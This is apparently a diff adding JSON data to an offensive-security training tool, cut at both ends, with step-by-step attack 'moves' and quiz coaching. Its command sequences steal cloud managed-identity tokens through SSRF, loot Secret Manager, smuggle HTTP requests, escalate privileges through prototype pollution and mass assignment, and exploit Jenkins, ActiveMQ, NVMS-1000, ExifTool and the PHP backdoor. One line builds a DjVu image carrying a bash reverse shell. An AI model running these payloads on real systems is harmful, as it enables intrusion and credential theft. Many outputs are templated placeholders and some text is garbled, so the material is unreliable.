+                "sig": "Pr0dDbP@ss"
+              }
+            ],
+            "note": "Feed recovered secrets into the credential loop."
+          },
+          {
+            "t": "Look for code execution",
+            "d": "A Contributor or VM-admin role lets you runCommand on a VM for a shell, or create a resource that hands you one.",
+            "demo": [
+              {
+                "run": "az vm run-command invoke -g rg-prod -n web-vm --command-id RunShellScript --scripts 'id'",
+                "out": "\"message\": \"uid=0(root)\"",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "runCommand executes as root/SYSTEM on the target VM."
+          }
+        ]
+      },
+      "situation": "An SSRF on an Azure VM can reach 169.254.169.254 with a Metadata header. What turns it into access?",
+      "choices": [
+        "azure-imds",
+        "aws-credential-abuse",
+        "ssrf",
+        "content-discovery"
+      ],
+      "coach": {
+        "aws-credential-abuse": "That is the AWS metadata path; this is Azure, which needs a resource-scoped token and the Metadata header.",
+        "ssrf": "The SSRF is how you reach the metadata service; now pull a managed-identity token and use it.",
+        "content-discovery": "You are past the web app; the surface now is the Azure subscription the identity can see."
+      }
+    },
+    "gcp-metadata": {
+      "why": "During an assessment, operators reach for this step to convert an initial lead into hard evidence without blind guessing. Rather than burning time on trial-and-error payloads, you run a focused check, inspect the terminal response for the confirmation marker, and feed the minted fact straight into the next phase of the attack chain. Key indicator: The responds through the",
+      "cmd": "curl -s -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token'",
+      "tool": "curl",
+      "output": "{\"access_token\":\"ya29.a0Af...\",\"expires_in\":3599,\"token_type\":\"Bearer\"}",
+      "signal": "ya29.",
+      "teach": "The service-account OAuth token came back (GCP tokens start ya29.). Use it with gcloud or the REST API to enumerate the project, read Secret Manager, and hunt for a role that runs code.",
+      "leadup": [
+        {
+          "key": "ssrf",
+          "label": "SSRF reaches the metadata server",
+          "steps": [
+            {
+              "title": "Confirm you are on GCP",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s -H 'Metadata-Flavor: Google' 'http://<target>/fetch?url=http://169.254.169.254/computeMetadata/v1/instance/?recursive=true'",
+              "out": "{\"machineType\":\"projects/12345/machineTypes/e2-medium\",\"zone\":\"projects/12345/zones/us-central1-a\"}",
+              "sig": "machineType",
+              "teach": "Instance metadata confirms a GCP VM and names the project, so a service-account token is likely reachable."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "GCP metadata abuse is smuggle the token out through the SSRF, then use it to enumerate and loot the project.",
+        "items": [
+          {
+            "t": "Pull the service-account token",
+            "d": "Ask the metadata server for the default service account's OAuth token, passing the Metadata-Flavor header the SSRF must smuggle.",
+            "demo": [
+              {
+                "run": "curl -s -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token'",
+                "out": "{\"access_token\":\"ya29.a0Af...\"}",
+                "sig": "ya29."
+              }
+            ],
+            "note": "Check the account's scopes at .../default/scopes; a cloud-platform scope is the broad one."
+          },
+          {
+            "t": "Enumerate what the token can see",
+            "d": "Load the token into gcloud or call the REST API to list projects, buckets, secrets, and service accounts the identity can reach.",
+            "demo": [
+              {
+                "run": "curl -s -H 'Authorization: Bearer {{bearer}}' 'https://cloudresourcemanager.googleapis.com/v1/projects'",
+                "out": "\"projectId\": \"acme-prod\"",
+                "sig": "projectId"
+              }
+            ],
+            "note": "The IAM roles on the service account decide how far you get."
+          },
+          {
+            "t": "Loot Secret Manager and Storage",
+            "d": "Read stored secrets and bucket objects, which routinely hold database and admin credentials that reuse onto the hosts you are attacking.",
+            "demo": [
+              {
+                "run": "curl -s -H 'Authorization: Bearer {{bearer}}' 'https://secretmanager.googleapis.com/v1/projects/acme-prod/secrets/db-password/versions/latest:access'",
+                "out": "\"payload\":{\"data\":\"UHIwZERiUEBzcw==\"}",
+                "sig": "payload",
+                "teach": ""
+              }
+            ],
+            "note": "The value is base64; decode it and feed it into the credential loop."
+          },
+          {
+            "t": "Look for code execution",
+            "d": "A role that lets you actAs a service account and deploy a function or VM gives you execution in the project.",
+            "demo": [
+              {
+                "run": "curl -s -H 'Authorization: Bearer {{bearer}}' 'https://iam.googleapis.com/v1/projects/acme-prod/serviceAccounts'",
+                "out": "\"email\": \"deployer@acme-prod.iam.gserviceaccount.com\"",
+                "sig": "gserviceaccount.com"
+              }
+            ],
+            "note": "actAs on a privileged service account is the escalation to execution."
+          }
+        ]
+      },
+      "situation": "An SSRF on a GCP VM can reach 169.254.169.254 with the Metadata-Flavor header. What turns it into access?",
+      "choices": [
+        "gcp-metadata",
+        "azure-imds",
+        "aws-credential-abuse",
+        "ssrf"
+      ],
+      "coach": {
+        "azure-imds": "That is the Azure path; GCP uses the Metadata-Flavor header and an OAuth token that starts ya29.",
+        "aws-credential-abuse": "That is the AWS path; GCP hands an OAuth token, not AWS keys.",
+        "ssrf": "The SSRF is how you reach the metadata server; now pull the service-account token and use it."
+      }
+    },
+    "http-request-smuggling": {
+      "why": "During an assessment, operators reach for this step to convert an initial lead into hard evidence without blind guessing. Rather than burning time on trial-and-error payloads, you run a focused check, inspect the terminal response for the confirmation marker, and feed the minted fact straight into the next phase of the attack chain. Key indicator: A front-end is confirmed.",
+      "cmd": "curl -s -o /dev/null -w '%{http_code} %{time_total}\\n' --data-binary @clte.txt http://10.10.10.10/",
+      "tool": "curl",
+      "output": "200 5.02",
+      "signal": "5.02",
+      "teach": "The timed delay is the tell: the back-end is waiting for bytes that never come because the front-end already forwarded a shortened request. That timing gap confirms a CL.TE desync worth developing into a smuggled request.",
+      "leadup": [
+        {
+          "key": "chain",
+          "label": "A request passes two parsers",
+          "steps": [
+            {
+              "title": "Spot a front-end proxy",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -sI http://<target>/ | grep -iE 'Via|X-Cache|Server'",
+              "out": "Via: 1.1 varnish\nX-Cache: MISS",
+              "sig": "Via: 1.1 varnish",
+              "teach": "A Via or cache header means a front-end sits in front of the origin, which is the precondition for a desync."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Request smuggling is find the CL/TE disagreement, confirm it with a timing probe, then develop it into a smuggled request.",
+        "items": [
+          {
+            "t": "Probe for a desync with timing",
+            "d": "Send a CL.TE (or TE.CL) probe where the back-end is left waiting for a body chunk; a long, consistent delay confirms the desync while a well-formed control request returns instantly.",
+            "demo": [
+              {
+                "run": "curl -s -o /dev/null -w '%{time_total}\\n' --data-binary @clte-probe.txt http://<target>/",
+                "out": "5.01",
+                "sig": "5.01"
+              }
+            ],
+            "note": "Burp's smuggler extension automates the probe and tells you which variant works."
+          },
+          {
+            "t": "Confirm with a well-formed control",
+            "d": "The same request made unambiguous should return fast; the difference rules out ordinary latency.",
+            "demo": [
+              {
+                "run": "curl -s -o /dev/null -w '%{time_total}\\n' --data-binary @control.txt http://<target>/",
+                "out": "0.08",
+                "sig": "0.08"
+              }
+            ],
+            "note": "A clear fast/slow split is the signature of a real desync."
+          },
+          {
+            "t": "Smuggle a prefix",
+            "d": "Prepend a request that the back-end queues; the next victim request gets your prefix glued to its front, so you can route it to an admin path or capture it.",
+            "demo": [
+              {
+                "run": "curl -s --data-binary @smuggle.txt http://<target>/ | grep -i 'admin'",
+                "out": "HTTP/1.1 200 OK\\nX-Admin: true",
+                "sig": "X-Admin: true"
+              }
+            ],
+            "note": "Developing the gadget is iterative; keep the back-end queue in mind."
+          },
+          {
+            "t": "Turn it into impact",
+            "d": "Depending on the app, smuggling bypasses the front-end control, poisons the shared cache, or captures another user's authenticated request.",
+            "note": "Scope this carefully; it affects other users' traffic."
+          }
+        ]
+      },
+      "situation": "A request passes through a caching proxy to an origin, and a CL.TE timing probe hangs for five seconds while the control returns instantly. What is the move?",
+      "choices": [
+        "http-request-smuggling",
+        "check-cors",
+        "ssrf",
+        "content-discovery"
+      ],
+      "coach": {
+        "check-cors": "CORS is a browser control; the desync here is a server-side parser disagreement between the proxy and the origin.",
+        "ssrf": "SSRF makes the server fetch a URL; smuggling abuses how two servers frame the same request.",
+        "content-discovery": "You already have the surface; the finding is the parser disagreement, not an undiscovered path."
+      }
+    },
+    "prototype-pollution": {
+      "why": "In JavaScript every object inherits from a shared prototype, so if an app merges your keys into an object without filtering __proto__, you can add a property like isAdmin to every object at once, which flips an authorization check. In practice, you reach for this step when when an app merges JSON you control into an object (a settings or profile update). Success looks like: The injected property shows up where it should not.",
+      "cmd": "curl -s -X POST http://10.10.10.10/api/profile -H 'Content-Type: application/json' -d '{\"__proto__\":{\"polluted\":\"yes\"}}'",
+      "tool": "curl",
+      "output": "{\"status\":\"ok\",\"profile\":{\"name\":\"bob\",\"polluted\":\"yes\"}}",
+      "signal": "\"polluted\":\"yes\"",
+      "teach": "The property you set via __proto__ came back on an object that never had it, so the merge polluted the shared prototype. Now find a gadget that reads a privileged property (isAdmin, or a template/exec option) to turn pollution into impact.",
+      "leadup": [
+        {
+          "key": "merge",
+          "label": "The app merges your JSON",
+          "steps": [
+            {
+              "title": "Find a nested-key sink",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s -X POST http://<target>/api/settings -H 'Content-Type: application/json' -d '{\"a\":{\"b\":1}}'",
+              "out": "{\"status\":\"ok\",\"settings\":{\"a\":{\"b\":1}}}",
+              "sig": "\"a\":{\"b\":1}",
+              "teach": "An endpoint that accepts and stores nested JSON is a candidate for a recursive merge that honours __proto__."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Prototype pollution is confirm the pollutable merge, then chain it to a gadget that reads the polluted property.",
+        "items": [
+          {
+            "t": "Confirm the pollution",
+            "d": "Send a __proto__ key and read back an object that should not carry it; if your property appears, the merge pollutes the shared prototype.",
+            "demo": [
+              {
+                "run": "curl -s -X POST http://<target>/api/profile -H 'Content-Type: application/json' -d '{\"__proto__\":{\"polluted\":\"yes\"}}'",
+                "out": "{\"profile\":{\"name\":\"bob\",\"polluted\":\"yes\"}}",
+                "sig": "\"polluted\":\"yes\""
+              }
+            ],
+            "note": "constructor.prototype is the fallback when __proto__ is filtered."
+          },
+          {
+            "t": "Escalate via a privileged property",
+            "d": "Pollute a property the app trusts for authorization, then hit an endpoint that reads it.",
+            "demo": [
+              {
+                "run": "curl -s -X POST http://<target>/api/profile -H 'Content-Type: application/json' -d '{\"__proto__\":{\"isAdmin\":true}}'",
+                "out": "{\"status\":\"ok\"}",
+                "sig": "\"status\":\"ok\""
+              }
+            ],
+            "note": "Then request an admin route and see whether the polluted isAdmin is honoured."
+          },
+          {
+            "t": "Chain to a gadget for RCE",
+            "d": "Where a polluted property reaches a template engine or a child_process option, a published gadget turns pollution into code execution.",
+            "demo": [
+              {
+                "run": "curl -s http://<target>/admin -b session=... | grep -i 'dashboard'",
+                "out": "<title>Admin Dashboard</title>",
+                "sig": "Admin Dashboard"
+              }
+            ],
+            "note": "The gadget is app-specific; map the libraries in use to the known pollution gadgets."
+          }
+        ]
+      },
+      "situation": "A JSON endpoint merges nested keys, and sending __proto__ makes a new property appear on an unrelated object. What is the move?",
+      "choices": [
+        "prototype-pollution",
+        "mass-assignment",
+        "idor",
+        "ssti"
+      ],
+      "coach": {
+        "mass-assignment": "Mass assignment sets a field on your own record; this pollutes the shared prototype so every object inherits it.",
+        "idor": "IDOR reaches another object by id; here you are changing the prototype all objects derive from.",
+        "ssti": "Template injection evaluates an expression; prototype pollution may feed a template gadget, but the primitive is the polluted merge."
+      }
+    },
+    "mass-assignment": {
+      "why": "During an assessment, operators reach for this step to convert an initial lead into hard evidence without blind guessing. Rather than burning time on trial-and-error payloads, you run a focused check, inspect the terminal response for the confirmation marker, and feed the minted fact straight into the next phase of the attack chain. Key indicator: The response reveals writable the UI shows.",
+      "cmd": "curl -s -X PATCH http://10.10.10.10/api/users/me -H 'Content-Type: application/json' -d '{\"role\":\"admin\"}'",
+      "tool": "curl",
+      "output": "{\"id\":7,\"username\":\"bob\",\"role\":\"admin\"}",
+      "signal": "\"role\":\"admin\"",
+      "teach": "The update accepted a role field the form never exposed and set it to admin, so the binder is not allow-listed. You just escalated your own account with one request.",
+      "leadup": [
+        {
+          "key": "fields",
+          "label": "The object has hidden fields",
+          "steps": [
+            {
+              "title": "Read your own record",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s http://<target>/api/users/me -b session=...",
+              "out": "{\"id\":7,\"username\":\"bob\",\"role\":\"user\",\"verified\":true}",
+              "sig": "\"role\":\"user\"",
+              "teach": "The response exposes a role field the signup form never showed, which is exactly the field to try setting."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Mass assignment is diff accepted fields against shown fields, then send the privileged one back.",
+        "items": [
+          {
+            "t": "Inventory the model fields",
+            "d": "Read an object the API returns; every field it shows is a candidate you may be able to write, including ones the form hides.",
+            "demo": [
+              {
+                "run": "curl -s http://<target>/api/users/me -b session=...",
+                "out": "{\"id\":7,\"role\":\"user\",\"verified\":true,\"balance\":0}",
+                "sig": "\"role\":\"user\""
+              }
+            ],
+            "note": "role, isAdmin, verified, and balance are the classic privileged fields."
+          },
+          {
+            "t": "Send the privileged field back",
+            "d": "Add the field to an update request the UI would never include it in, and see whether the binder accepts it.",
+            "demo": [
+              {
+                "run": "curl -s -X PATCH http://<target>/api/users/me -H 'Content-Type: application/json' -d '{\"role\":\"admin\"}' -b session=...",
+                "out": "{\"id\":7,\"username\":\"bob\",\"role\":\"admin\"}",
+                "sig": "\"role\":\"admin\""
+              }
+            ],
+            "note": "If it echoes the new value, the write stuck."
+          },
+          {
+            "t": "Confirm the escalation",
+            "d": "Use the account on a privileged route to confirm the new field is honoured, not just stored.",
+            "demo": [
+              {
+                "run": "curl -s http://<target>/admin -b session=... | grep -i 'dashboard'",
+                "out": "<title>Admin Dashboard</title>",
+                "sig": "Admin Dashboard"
+              }
+            ],
+            "note": "Stored-but-ignored is a weaker finding than stored-and-honoured; prove which it is."
+          },
+          {
+            "t": "Try it at signup too",
+            "d": "The create endpoint is often less guarded than update; set the privileged field in the registration body.",
+            "demo": [
+              {
+                "run": "curl -s -X POST http://<target>/api/register -H 'Content-Type: application/json' -d '{\"username\":\"x\",\"password\":\"x\",\"role\":\"admin\"}'",
+                "out": "{\"id\":8,\"username\":\"x\",\"role\":\"admin\"}",
+                "sig": "\"role\":\"admin\""
+              }
+            ],
+            "note": "A fresh admin account is cleaner than escalating a watched one."
+          }
+        ]
+      },
+      "situation": "A profile API returns a role field the signup form never showed, and a PATCH with role:admin echoes it back. What is the move?",
+      "choices": [
+        "mass-assignment",
+        "idor",
+        "prototype-pollution",
+        "jwt-attacks"
+      ],
+      "coach": {
+        "idor": "IDOR changes which object you reach; mass assignment changes a field on the object you already own.",
+        "prototype-pollution": "That pollutes the shared prototype; here the framework is binding your field straight onto the model.",
+        "jwt-attacks": "The token is fine; the flaw is the binder writing a field the client should not control."
+      }
+    },
+    "jenkins-cli-fileread": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once test unauthenticated arbitrary file read via Jenkins CLI CVE-2024-23897. The key confirmation is: Contents of target file (/etc/passwd) displayed in CLI output.",
+      "cmd": "java -jar jenkins-cli.jar -s http://{{target}}:{{web_port|8080}}/ -http connect-node \"@/etc/passwd\"",
+      "tool": "java",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Contents of target file (/etc/passwd) displayed in CLI output.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Jenkins CLI Arbitrary File Read (CVE-2024-23897), confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Download jenkins-cli.jar from http://<target>:8080/jnlpJars/jenkins-cli.jar.",
+            "demo": [
+              {
+                "run": "java -jar jenkins-cli.jar -s http://{{target}}:{{web_port|8080}}/ -http connect-node \"@/etc/passwd\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Contents of target file (/etc/passwd) displayed in CLI output."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Read /var/jenkins_home/secrets/master.key using the CLI @ file expansion.",
+            "demo": [
+              {
+                "run": "java -jar jenkins-cli.jar -s http://{{target}}:{{web_port|8080}}/ -http connect-node \"@/var/jenkins_home/secrets/master.key\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "master.key contents successfully retrieved."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Read /var/jenkins_home/secrets/hudson.util.Secret via the CLI.",
+            "demo": [
+              {
+                "run": "java -jar jenkins-cli.jar -s http://{{target}}:{{web_port|8080}}/ -http connect-node \"@/var/jenkins_home/secrets/hudson.util.Secret\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "hudson.util.Secret retrieved."
+          }
+        ]
+      },
+      "situation": "Scenario: Test unauthenticated arbitrary file read via Jenkins CLI CVE-2024-23897. Which move should you run next?",
+      "choices": [
+        "jenkins-cli-fileread",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is Jenkins CLI Arbitrary File Read (CVE-2024-23897).",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is Jenkins CLI Arbitrary File Read (CVE-2024-23897).",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is Jenkins CLI Arbitrary File Read (CVE-2024-23897)."
+      }
+    },
+    "activemq-cve-2023-46604": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once exploit Apache ActiveMQ OpenWire deserialization for remote code execution. The key confirmation is: Reverse shell connection received from the ActiveMQ target host.",
+      "cmd": "python3 activemq_cve_2023_46604.py -t {{target}} -p {{openwire_port|61616}} -u http://{{attacker_ip}}:{{attacker_port|8000}}/poc.xml",
+      "tool": "python3",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Reverse shell connection received from the ActiveMQ target host.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Apache ActiveMQ OpenWire Remote Code Execution (CVE-2023-46604), confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Host an XML ClassPathXmlApplicationContext file on your attacking HTTP server.",
+            "demo": [
+              {
+                "run": "python3 activemq_cve_2023_46604.py -t {{target}} -p {{openwire_port|61616}} -u http://{{attacker_ip}}:{{attacker_port|8000}}/poc.xml",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Reverse shell connection received from the ActiveMQ target host."
+          },
+          {
+            "t": "Verify the result and capture proof",
+            "d": "Confirm that the output proves the hypothesis before chaining the next move.",
+            "demo": [
+              {
+                "run": "id; hostname",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Does not prove: does not prove root or Administrator privileges; privilege escalation may be required following the initial shell"
+          }
+        ]
+      },
+      "situation": "Scenario: Exploit Apache ActiveMQ OpenWire deserialization for remote code execution. Which move should you run next?",
+      "choices": [
+        "activemq-cve-2023-46604",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is Apache ActiveMQ OpenWire Remote Code Execution (CVE-2023-46604).",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is Apache ActiveMQ OpenWire Remote Code Execution (CVE-2023-46604).",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is Apache ActiveMQ OpenWire Remote Code Execution (CVE-2023-46604)."
+      }
+    },
+    "nvms1000-traversal": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once verify unauthenticated directory traversal on TVT NVMS-1000. The key confirmation is: win.ini file contents returned confirming traversal vulnerability.",
+      "cmd": "curl -s -i \"http://{{target}}:{{web_port|80}}/../../../../../../../../windows/win.ini\"",
+      "tool": "curl",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "win.ini file contents returned confirming traversal vulnerability.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute TVT NVMS-1000 Directory Traversal Arbitrary File Read (CVE-2019-20085), confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Send a GET request with traversal sequences requesting windows/win.ini.",
+            "demo": [
+              {
+                "run": "curl -s -i \"http://{{target}}:{{web_port|80}}/../../../../../../../../windows/win.ini\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "win.ini file contents returned confirming traversal vulnerability."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Send traversal request pointing to C:\\Users\\Administrator\\Desktop\\root.txt.",
+            "demo": [
+              {
+                "run": "curl -s -i \"http://{{target}}:{{web_port|80}}/../../../../../../../../Users/Administrator/Desktop/root.txt\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Administrator proof/root flag captured directly."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Request Program Files/NSClient++/nsclient.ini via directory traversal.",
+            "demo": [
+              {
+                "run": "curl -s -i \"http://{{target}}:{{web_port|80}}/../../../../../../../../Program%20Files/NSClient%2B%2B/nsclient.ini\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "NSClient++ administrator password extracted from configuration."
+          }
+        ]
+      },
+      "situation": "Scenario: Verify unauthenticated directory traversal on TVT NVMS-1000. Which move should you run next?",
+      "choices": [
+        "nvms1000-traversal",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is TVT NVMS-1000 Directory Traversal Arbitrary File Read (CVE-2019-20085).",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is TVT NVMS-1000 Directory Traversal Arbitrary File Read (CVE-2019-20085).",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is TVT NVMS-1000 Directory Traversal Arbitrary File Read (CVE-2019-20085)."
+      }
+    },
+    "exiftool-cve-2021-22204": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once check ExifTool version to verify vulnerability to CVE-2021-22204. The key confirmation is: Vulnerable ExifTool version confirmed.",
+      "cmd": "exiftool -ver",
+      "tool": "exiftool",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Vulnerable ExifTool version confirmed.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute ExifTool Metadata Arbitrary Code Execution (CVE-2021-22204), confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Run exiftool -ver on the system or check banner information in web responses.",
+            "demo": [
+              {
+                "run": "exiftool -ver",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Vulnerable ExifTool version confirmed."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Use python3 to assemble a DjVu file with malicious ANT metadata containing backticks.",
+            "demo": [
+              {
+                "run": "python3 -c 'import sys; payload = b\"(metadata\\n\\t(Copyright \\\"\\\\\\n\" b\"`bash -i >& /dev/tcp/\" + sys.argv[1].encode() + b\"/\" + sys.argv[2].encode() + b\" 0>&1`\\\"))\"; open(\"exploit.djvu\", \"wb\").write(payload)' {{lhost}} {{lport}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Crafted exploit image generated ready for upload."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Send POST multipart request with the crafted image to the application's file upload form.",
+            "demo": [
+              {
+                "run": "curl -F 'file=@exploit.jpg' http://{{target}}/upload",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Interactive reverse shell obtained on the server as the web service user."
+          }
+        ]
+      },
+      "situation": "Scenario: Check ExifTool version to verify vulnerability to CVE-2021-22204. Which move should you run next?",
+      "choices": [
+        "exiftool-cve-2021-22204",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is ExifTool Metadata Arbitrary Code Execution (CVE-2021-22204).",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is ExifTool Metadata Arbitrary Code Execution (CVE-2021-22204).",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is ExifTool Metadata Arbitrary Code Execution (CVE-2021-22204)."
+      }
+    },
+    "php-backdoor-useragent": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once verify PHP 8.1.0-dev User-Agentt backdoor command execution. The key confirmation is: PHP 8.1.0-dev backdoor command execution verified.",
+      "cmd": "curl -s -H \"User-Agentt: zerodium system('id');\" http://{{target}}/",
+      "tool": "curl",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "PHP 8.1.0-dev backdoor command execution verified.",
+      "leadup": [
+        {
